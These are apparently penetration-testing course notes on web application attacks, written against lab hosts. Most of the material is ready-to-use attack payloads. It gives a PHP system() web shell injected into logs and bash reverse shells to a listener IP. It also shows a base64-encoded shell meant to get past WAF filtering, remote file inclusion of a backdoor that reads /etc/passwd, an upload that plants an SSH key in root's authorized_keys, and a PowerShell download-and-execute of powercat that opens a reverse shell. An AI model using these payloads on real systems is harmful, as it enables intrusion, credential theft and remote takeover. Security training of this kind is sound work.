---
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Module 9: Common Web Application Attacks

## Directory Traversal

### Absolute vs Relative Paths

### Identifying and Exploiting Directory Traversals

### Encoding Special Characters

## File Inclusion Vulnerabilities

### Local File Inclusion (LFI)

The difference here is that including a local file will execute it rather than read the contents of it. Using Log Poisoning with php and LFI, we can execute commands on the web server.

Taking a look at the previous directory traversal vulnerability, let's see what information is stored in the `/var/log/apache2/access.log`. In the example provided, the User-Agent is stored. Using this information we can pass along a crafted User-Agent to execute commands via a cmd parameter. Sending to the `index.php?page=admin.php` a crafted user-agent of `User-Agent: <?php echo system($_GET['cmd']); ?>` Utilizing this string, we can then navigated to the access.log, appending `&cmd=<our command here>` to execute via LFI.

After testing that the cmd parameter works, let's get a reverse shell. We'll need to URL encode the data so it's treated correctly. A simple reverse shell one-liner in bash: `bash -c "bash -i >& /dev/tcp/my.listener.ip.here/port 0>&1"` would be URL encoded as `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.236%2F1337%200%3E%261%22` Another example might be `bash+-c+'bash+-i+>%26+/dev/tcp/192.168.45.236/1337+0>%261'%22`

### PHP Wrappers

Include the contents of a file:

* php://filter

Using the PHP filter wrapper in a similar way as previous sections: `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php` This results in a similar content as requesting admin.php earlier. Using teh PHP filter to encode the content in base64, we can get the content of admin.php. `curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php`

Achieve code execution:

* data:// Using the PHP data wrapper to execute commands: `curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"`

Some WAFs may filter strings such as system, so we'll base64 the command.

```bash
$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```

### Remote File Inclusion (RFI)

Kali includes several webshells are `/usr/share/webshells/` that can be used for RFI.

For RFI, you'll need your remote files to be available somewhere. This can easily be done with `python3 -m http.server 80` which will start a listener on port 80 on all your local interfaces. This hosts any files in your current working directory. Example: `curl http://mountaindesserts.com/meteor/index.php?page=http://your.listener.ip.here/simple-backdoor.php&cmd=cat+/etc/passwd`

## File Upload Vulnerabilities

### Using Executable Files

Identifying file upload vulnerabilities:

* Can we upload a file in general?
* Is there file extension limitations? Are they case sensitive? Can we use "legacy" extensions? ex. .phps, .php7

### Using Non-Executable Files

When using non-executable files, we _may_ be able to overwrite important files like `.ssh/authorized_keys` for example. Example in Burp Suite's Repeater:

```http
POST /upload HTTP/1.1
Host: 192.168.241.16:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:130.0) Gecko/20100101 Firefox/130.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------39100938162538926675637912586
Content-Length: 386
Origin: http://192.168.241.16:8000
Connection: keep-alive
Referer: http://192.168.241.16:8000/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------39100938162538926675637912586
Content-Disposition: form-data; name="myFile"; filename="../../../../../../../../../../root/.ssh/authorized_keys"
Content-Type: application/octet-stream

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH7b2Apfpf+ynNDsc702r7dotHjS9RH9gF6AvRP9w5SD user@hostname.local

-----------------------------39100938162538926675637912586--

```

## Command Injection

### OS Command Injection

While communicating with a Windows device vulnerable to command injection, you can use ``(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell`` to determine if you're running commands inside a CMD or PowerShell prompt. This would likely need to be URL encoded. If inside PowerShell, PowerCat can be used to create a reverse shell. PowerCat is a PowerShell implementation of Netcat included in Kali at `/usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1`.

* Example usage of powercat.ps1 via command injection: `IEX (New-Object System.Net.Webclient).DownloadString("http://your.listener.ip.here:port/powercat.ps1");powercat -c your.listener.ip.here -p port -e powershell`
  * Curling that with URL encoding may look like this: `curl -X POST --data 'Archive=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2Fyour.listener.ip.here%3Aport%2Fpowercat.ps1%22)%3Bpowercat%20-c%20your.listener.ip.here%20-p%20port%20-e%20powershell' http://your.target.ip.here:port/archive`
